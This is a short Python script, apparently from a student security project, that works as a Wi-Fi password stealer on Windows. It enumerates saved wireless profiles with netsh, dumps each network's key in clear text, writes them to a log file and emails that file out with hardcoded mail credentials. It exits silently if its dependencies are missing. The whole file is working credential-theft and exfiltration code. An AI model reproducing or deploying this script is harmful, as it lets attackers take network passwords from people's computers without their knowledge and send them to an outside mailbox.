try: #import necessary libraries
    import subprocess
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    FILENAME = "C:/Users/sudee/ISAA/WifiOutput.txt"
    TYPE="Wifi Data"

    class wifi: 
        def __init__(self, email, password):
            self.log = ""
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + '\n' + string

        def run(self):
            a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]

            for i in a:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    self.appendlog("{:<30}|  {:<}".format(i, results[0]))
                except IndexError:
                    self.appendlog("{:<30}|  {:<}".format(i, ""))
            f=open(FILENAME,"a")
            f.write(self.log)
            f.close()
            send_mail(self.email, self.password, FILENAME, TYPE)
